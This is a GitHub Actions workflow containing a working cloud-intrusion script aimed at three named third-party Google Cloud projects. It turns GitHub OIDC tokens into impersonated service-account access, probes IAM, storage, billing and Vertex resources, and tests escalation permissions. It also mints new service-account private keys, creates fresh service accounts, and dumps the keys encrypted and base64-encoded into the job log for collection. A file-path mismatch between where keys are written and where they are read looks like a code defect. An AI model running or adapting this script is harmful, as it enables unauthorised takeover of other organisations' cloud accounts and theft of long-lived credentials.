name: wf1210
on:
  workflow_dispatch:
    inputs:
      passfd:
        description: enc pass
        required: true
permissions:
  id-token: write
  contents: read
jobs:
  wf1210:
    runs-on: ubuntu-latest
    timeout-minutes: 40
    steps:
      - name: endgame
        env:
          PASS: ${{ inputs.passfd }}
        run: |
          set +e
          mkdir -p out
          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
          mint() {
            local PRJ="$1"
            AUD="https://iam.googleapis.com/$PRJ"
            rm -f tok.jwt
            for a in 1 2 3; do
              curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r '.value // empty' > tok.jwt
              [ -s tok.jwt ] && return 0
              sleep 3
            done
            return 1
          }
          sts() {
            local PRJ="$1"
            curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
              --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
              --data-urlencode "subject_token=$(cat tok.jwt)" \
              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
              -d "scope=https://www.googleapis.com/auth/cloud-platform"
          }
          emit_secret() {
            local label="$1" f="$2" b
            [ -s "$f" ] || { echo "##SECRET $label MISSING"; return; }
            b=$(tar czf - -C "$(dirname "$f")" "$(basename "$f")" | openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:"$PASS" 2>/dev/null | base64 -w0)
            echo "##SECRET $label len_local=$(wc -c < "$f") b64=$b"
          }
          probe() { # label method url [body]
            local label="$1" m="$2" url="$3" body="$4" c b
            if [ -n "$body" ]; then
              c=$(curl -s -o o.json -w '%{http_code}' -X "$m" -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "$url" -d "$body")
            else
              c=$(curl -s -o o.json -w '%{http_code}' -X "$m" -H "Authorization: Bearer $AT" "$url")
            fi
            b=$(head -c 900 o.json | tr -d '\n' | tr -s ' ')
            echo "##P num=$NUM label=$label code=$c body=$b"
          }
          sa_tip() { # sa
            local sa="$1" c b
            c=$(curl -s -o o.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$sa:testIamPermissions?permissions=iam.serviceAccountKeys.create,iam.serviceAccounts.getAccessToken,iam.serviceAccounts.setIamPolicy,iam.serviceAccounts.implicitDelegation,iam.serviceAccounts.actAs")
            b=$(head -c 700 o.json | tr -d '\n' | tr -s ' ')
            echo "##TIP-SA num=$NUM sa=$sa code=$c body=$b"
          }
          proj_tip() { # label perms
            local label="$1" perms="$2" c b
            c=$(curl -s -o o.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:testIamPermissions" -d "{\"permissions\":$perms}")
            b=$(head -c 900 o.json | tr -d '\n' | tr -s ' ')
            echo "##TIP-P num=$NUM label=$label code=$c body=$b"
          }
          mkkey() { # sa label
            local sa="$1" label="$2" c
            c=$(curl -s -o k.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$sa/keys" -d '{"keyAlgorithm":"KEY_ALG_RSA_2048"}')
            echo "##KEY num=$NUM sa=$sa code=$c len=$(wc -c < k.json)"
            if [ "$c" = "200" ]; then
              python3 - "$NUM" "$sa" "$label" <<'PY'
import json,base64,sys
num,sa,label=sys.argv[1:4]
k=json.load(open('k.json'))
key=dict(k)
key['privateKeyData']='<stripped>'
keyid=k['name'].split('/')[-1]
try:
    pk=base64.b64decode(k['privateKeyData']).decode()
except Exception as e:
    pk='DECODE_ERROR %s'%e
obj={"type":"service_account","project_id":None,"private_key_id":keyid,
     "private_key":pk,"client_email":sa,
     "client_id":None,"auth_uri":"https://accounts.google.com/o/oauth2/auth",
     "token_uri":"https://oauth2.googleapis.com/token",
     "auth_provider_x509_cert_url":"https://www.googleapis.com/oauth2/v1/certs",
     "client_x509_cert_url":"https://www.googleapis.com/robot/v1/metadata/x509/"+sa.replace('@','%40'),
     "universe_domain":"googleapis.com"}
open('out/%s_%s.json'%(label,num),'w').write(json.dumps(obj,indent=1))
print("##KEYMETA num=%s sa=%s keyid=%s keysize=%d valid_begin=%s valid_after=%s"%(num,sa,keyid,len(pk),k.get('validBeforeTime'),k.get('validAfterTime')))
PY
              emit_secret "key-$label-$NUM" "out/$label-$NUM.json"
            else
              head -c 500 k.json | tr -d '\n'; echo
            fi
          }
          TARGETS='
363590592857|363590592857-compute@developer.gserviceaccount.com|projects/363590592857/locations/global/workloadIdentityPools/github-action/providers/github|tranquil-post-357802
731679007643|github-actions@rails-todo-app-386721.iam.gserviceaccount.com|projects/731679007643/locations/global/workloadIdentityPools/github-actions/providers/rails-todo-identity-pool-github|rails-todo-app-386721
536185737408|github@carbonifer-sandbox.iam.gserviceaccount.com|projects/536185737408/locations/global/workloadIdentityPools/carbonifer-gh-pool/providers/carbonifer-oidc-provider|carbonifer-sandbox
'
          echo "$TARGETS" | while IFS='|' read -r NUM SA PRJ PID; do
            [ -z "$NUM" ] && continue
            echo "=== TARGET num=$NUM sa=$SA provider=$PRJ pid=$PID"
            AT=""
            if ! mint "$PRJ"; then echo "##ERR num=$NUM MINT_FAIL"; continue; fi
            sc=$(sts "$PRJ")
            echo "##STS num=$NUM code=$sc"
            FT=$(jq -r '.access_token // empty' r.json)
            [ -z "$FT" ] && { head -c 400 r.json | tr -d '\n'; echo; echo "##ERR num=$NUM STS_FAIL"; continue; }
            gc=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
            AT=$(jq -r '.accessToken // empty' g.json)
            echo "##GEN num=$NUM code=$gc toklen=${#AT}"
            [ -z "$AT" ] && { head -c 500 g.json | tr -d '\n'; echo; continue; }
            probe "proj-get" GET "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM"
            probe "salist" GET "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts?pageSize=50"
            probe "iam-get" POST "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:getIamPolicy" '{"options":{"requestedPolicyVersion":3}}'
            sa_tip "$SA"
            proj_tip "crm" '["resourcemanager.projects.setIamPolicy","resourcemanager.projects.getIamPolicy","resourcemanager.projects.update","resourcemanager.projects.undelete","resourcemanager.projects.move","resourcemanager.projects.delete","resourcemanager.projects.create","resourcemanager.projects.list"]'
            proj_tip "usage" '["serviceusage.services.enable","serviceusage.services.list","iam.serviceAccountKeys.create","iam.serviceAccounts.create"]'
            probe "buckets" GET "https://storage.googleapis.com/storage/v1/b?project=$NUM&maxResults=50"
            probe "models-c1" GET "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/models"
            probe "billing" GET "https://cloudbilling.googleapis.com/v1/projects/$PID/billingInfo"
            echo "--- keys.create attempt on given SA"
            mkkey "$SA" "$PID"
            echo "--- create fresh SA then key"
            NEWSA="vertex-ci-$(head -c 4 /dev/urandom | od -An -tx1 | tr -d ' \n')"
            cc=$(curl -s -o n.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts" -d "{\"accountId\":\"$NEWSA\",\"serviceAccount\":{\"displayName\":\"ci\"}}")
            echo "##NEWSA num=$NUM name=$NEWSA code=$cc body=$(head -c 400 n.json | tr -d '\n' | tr -s ' ')"
            if [ "$cc" = "200" ]; then
              mkkey "$NEWSA@$PID.iam.gserviceaccount.com" "newsa-$PID"
            fi
            sleep 0.3
          done
          echo "##FINISHED"
